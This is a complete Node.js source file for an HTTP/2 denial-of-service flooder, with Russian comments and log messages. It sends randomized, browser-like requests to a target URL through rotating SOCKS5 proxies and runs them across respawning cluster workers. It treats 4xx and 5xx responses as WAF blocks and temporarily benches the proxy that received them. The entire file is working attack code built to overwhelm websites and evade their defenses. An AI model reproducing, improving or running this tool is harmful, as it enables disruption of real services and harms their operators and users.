const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");
const { SocksClient } = require("socks");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function () {});

if (process.argv.length < 7) {
    console.log(`Использование: node socks5_flooder.js <target> <time> <rate> <threads> <proxyfile>`);
    process.exit();
}

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().replace(/\r/g, '').split('\n').filter(Boolean);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randomString(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

const proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

// Map: proxy -> timestamp разблокировки (в ms)
const blockedProxies = new Map();

const fetch_site = ["same-origin", "same-site", "cross-site"];
const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
const fetch_dest = ["document", "sharedworker", "worker"];

const languages = [
    "en-US,en;q=0.9", "en-GB,en;q=0.8", "es-ES,es;q=0.9",
    "fr-FR,fr;q=0.9,en;q=0.8", "de-DE,de;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8", "ja-JP,ja;q=0.9,en;q=0.8"
];

const useragents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
];

const referers = [
    "https://www.google.com/", "https://www.bing.com/",
    "https://duckduckgo.com/", "https://www.yahoo.com/", ""
];

class NetSocket {
    constructor() {}

    SOCKS5(options, callback) {
        const proxyParts = options.proxy.replace('socks5://', '').split(':');
        const socksOptions = {
            proxy: { host: proxyParts[0], port: parseInt(proxyParts[1]), type: 5 },
            command: 'connect',
            destination: { host: options.address.split(':')[0], port: 443 },
            timeout: options.timeout || 10000
        };

        SocksClient.createConnection(socksOptions, (err, info) => {
            if (err || !info?.socket) {
                return callback(undefined, err || "no socket");
            }
            const connection = info.socket;
            connection.setKeepAlive(true, 60000);
            callback(connection, undefined);
        });
    }
}

const Header = new NetSocket();

function buildHeaders() {
    const rand_query = "?" + randomString(12) + "=" + randomIntn(100000, 999999);
    const rand_path = (parsedTarget.path || "/") + rand_query;

    const headers = {
        ":method": "GET",
        ":scheme": "https",
        ":authority": parsedTarget.host,
        ":path": rand_path,
        "user-agent": randomElement(useragents),
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "accept-language": randomElement(languages),
        "accept-encoding": "gzip, deflate, br",
        "sec-fetch-site": randomElement(fetch_site),
        "sec-fetch-dest": randomElement(fetch_dest),
        "sec-fetch-mode": randomElement(fetch_mode),
        "upgrade-insecure-requests": "1"
    };

    const ref = randomElement(referers);
    if (ref) headers["referer"] = ref;

    if (Math.random() > 0.5) headers["dnt"] = "1";

    return headers;
}

// Временный бан прокси на 60 секунд
function tempBlockProxy(proxyAddr) {
    const until = Date.now() + 60000;
    blockedProxies.set(proxyAddr, until);
    console.log(`[WAF Detect] Прокси ${proxyAddr} получил блокировку → временный бан на 60 сек`);
}

function runFlooder() {
    // Выбираем прокси
    let proxyAddr;
    let attempts = 0;
    do {
        proxyAddr = randomElement(proxies);
        attempts++;
        if (attempts > 50) return; // Защита от бесконечного цикла, если все в бане
    } while (blockedProxies.has(proxyAddr) && blockedProxies.get(proxyAddr) > Date.now());

    Header.SOCKS5({ proxy: proxyAddr, address: parsedTarget.host + ":443", timeout: 10000 }, (connection, error) => {
        if (error || !connection) {
            tempBlockProxy(proxyAddr);
            return;
        }

        connection.setKeepAlive(true, 60000);

        const tlsOptions = {
            ALPNProtocols: ['h2'],
            rejectUnauthorized: false,
            socket: connection,
            servername: parsedTarget.host,
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                maxConcurrentStreams: 30,
                initialWindowSize: 65535,
                enablePush: false,
            },
            maxSessionMemory: 32000,
            createConnection: () => tlsConn,
            socket: connection,
        });

        let IntervalAttack = null;

        client.on("connect", () => {
            console.log(`[Flooder PID ${process.pid}] Успешное HTTP/2 соединение через ${proxyAddr} → начало атаки`);
            IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const headers = buildHeaders();
                    const request = client.request(headers);

                    request.on("response", (headers) => {
                        const status = headers[":status"];
                        if (status >= 400) { // 403, 429, 500 и т.д.
                            tempBlockProxy(proxyAddr);
                            request.destroy();
                        } else {
                            request.close();
                        }
                    });

                    request.on("error", () => {
                        tempBlockProxy(proxyAddr);
                        request.destroy();
                    });

                    request.end();
                }
            }, 1000);
        });

        const cleanup = () => {
            if (IntervalAttack) clearInterval(IntervalAttack);
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
        };

        client.on("close", cleanup);
        client.on("error", () => {
            tempBlockProxy(proxyAddr);
            cleanup();
        });
        tlsConn.on("error", () => {
            tempBlockProxy(proxyAddr);
            cleanup();
        });
        tlsConn.on("end", cleanup);
    });
}

// Мастер-процесс
if (cluster.isMaster) {
    console.log(`[Master] Загружено ${proxies.length} прокси. Запуск ${args.threads} потоков...`);
    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }

    cluster.on('exit', (worker) => {
        console.log(`[Master] Поток ${worker.process.pid} умер → запускаю новый`);
        cluster.fork();
    });
} else {
    setInterval(runFlooder, 5); // Очень часто пытаемся установить новые соединения
}

const KillScript = () => {
    console.log("[Flooder] Время атаки истекло.");
    process.exit(0);
};
setTimeout(KillScript, args.time * 1000);
